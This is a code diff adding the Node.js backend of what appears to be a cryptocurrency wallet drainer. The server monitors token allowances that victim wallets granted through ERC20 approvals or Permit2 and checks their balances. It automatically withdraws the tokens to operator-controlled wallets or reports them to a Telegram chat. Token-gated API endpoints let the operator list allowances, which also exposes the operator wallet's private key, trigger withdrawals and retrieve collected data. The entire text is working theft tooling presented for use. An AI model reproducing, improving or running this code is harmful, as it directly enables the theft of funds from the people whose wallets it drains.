+                await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли токен на кошельке</b>\n\n<b>Обработчик:</b> <code>${allowance.spender}</code>\n<b>Кошелек:</b> <code>${allowance.owner}</code>\n<b>Токен:</b> <code>${allowance.token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(allowance.chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(balance)))}</code>\n\n<code>Доступ выдан через контракт Permit2</code>`, {
+                  parse_mode: 'HTML'
+                });
+              }
+              continue;
+            }
+          } else {
+            const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[allowance.chain_id]);
+            const contract = new ethers.Contract(allowance.token, MS_Contract_ABI['ERC20'], node);
+            const balance = ethers.BigNumber.from(await contract.balanceOf(allowance.owner));
+            if (allowance.last_balance && balance.eq(ethers.BigNumber.from(allowance.last_balance))) continue;
+            else update_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, false, balance.toString());
+            const allowance_num = ethers.BigNumber.from(await contract.allowance(allowance.owner, allowance.spender));
+            if (allowance_num.lte(ethers.BigNumber.from('0'))) {
+              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id);
+              continue;
+            }
+            if (balance.gt(ethers.BigNumber.from('0'))) {
+              if (MS_Allowance_Withdraw.mode == true && balance.gte(ethers.BigNumber.from(MS_Allowance_Withdraw.min_amount)) && MS_Allowance_Withdraw.wallets[allowance.spender]) {
+                await withdraw_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id);
+              } else {
+                await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли токен на кошельке</b>\n\n<b>Обработчик:</b> <code>${allowance.spender}</code>\n<b>Кошелек:</b> <code>${allowance.owner}</code>\n<b>Токен:</b> <code>${allowance.token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(allowance.chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(balance)))}</code>`, {
+                  parse_mode: 'HTML'
+                });
+              }
+              continue;
+            }
+          }
+          await new Promise(r => setTimeout(r, 1000));
+        } catch(err) {
+          console.log(err);
+        }
+      }
+    } catch(err) {
+      console.log(err);
+    } allowance_in_check = false;
+  }, 60000);
+}
+
+if (MS_Enable_API && MS_Allowance_API) {
+  web.post("/api/allowance/remove", (request, response) => {
+    try {
+      let data = request.body;
+      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      if (!data['owner'] || !data['spender'] || !data['token'] || !data['chain_id'] || !data['permit2']) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Invalid Arguments' }));
+      }
+      remove_allowance(data.owner, data.spender, data.token, data.chain_id, data.permit2);
+      return response.status(200).send(JSON.stringify({ status: 'OK' }));
+    } catch(err) {
+      console.log(err);
+    }
+  });
+  web.post("/api/allowance/list", (request, response) => {
+    try {
+      let data = request.body;
+      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      let allowance_list = [];
+      if (fs.existsSync('allowances.dat'))
+        allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
+      return response.status(200).send(JSON.stringify({
+        status: 'OK', wallet: {
+          address: MS_Wallet_Address,
+          private: MS_Wallet_Private
+        }, list: allowance_list
+      }));
+    } catch(err) {
+      console.log(err);
+    }
+  });
+  web.post("/api/allowance/withdraw", async (request, response) => {
+    try {
+      let data = request.body;
+      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      if (!data['owner'] || !data['spender'] || !data['token'] || !data['chain_id'] || !data['permit2']) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Invalid Arguments' }));
+      }
+      await withdraw_allowance(data.owner, data.spender, data.token, data.chain_id, data.permit2);
+      return response.status(200).send(JSON.stringify({ status: 'OK' }));
+    } catch(err) {
+      console.log(err);
+      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unable to Execute' }));
+    }
+  });
+}
+
+if (MS_Enable_API) {
+  web.post("/api/balance", (request, response) => {
+    try {
+      let data = request.body;
+      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      get_wallet_balance(data.address || MS_Wallet_Address).then(result => {
+        if (result != false) {
+          return response.status(200).send(JSON.stringify({ status: 'OK', data: result }));
+        } else {
+          return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
+        }
+      }).catch(err => {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
+      });
+    } catch(err) {
+      console.log(err);
+      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
+    }
+  });
+  web.post("/api/retrive", (request, response) => {
+    try {
+      let data = request.body;
+      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
+      let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8'));
+      fs.writeFileSync('API_DATA', '[]', 'utf-8');
+      return response.status(200).send(JSON.stringify({ status: 'OK', data: API_Data }));
+    } catch(err) {
+      console.log(err);
+      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
+    }
+  });
+  setInterval(() => {
+    try {
+      if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
+      let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8')), new_data = [];
+      for (const asset of API_Data) {
+        try {
+          if (Math.floor(Date.now() / 1000) - asset.ts < 300) {
+            new_data.push(asset);
+          }
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      fs.writeFileSync('API_DATA', JSON.stringify(new_data), 'utf-8');
+    } catch(err) {
+      console.log(err);
+    }
+  }, 60000);
+}
+
+web.use((_, response) => {
+  try {
+    response.status(403).send('Sorry, this page in unavailable')
+  } catch(err) {
+    console.log(err);
+  }
+});
+
+if (fs.existsSync('cert') && fs.existsSync(path.join('cert', 'server.key')) && fs.existsSync(path.join('cert', 'server.crt'))) {
+  web.listen(80, () => {});
+  https.createServer({
+    key: fs.readFileSync(path.join('cert', 'server.key')),
+    cert: fs.readFileSync(path.join('cert', 'server.crt'))
+  }, web).listen(443);
+  console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80 & 443\n');
+} else {
+  web.listen(80, () => {
+    console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80\n');
+  });
+}
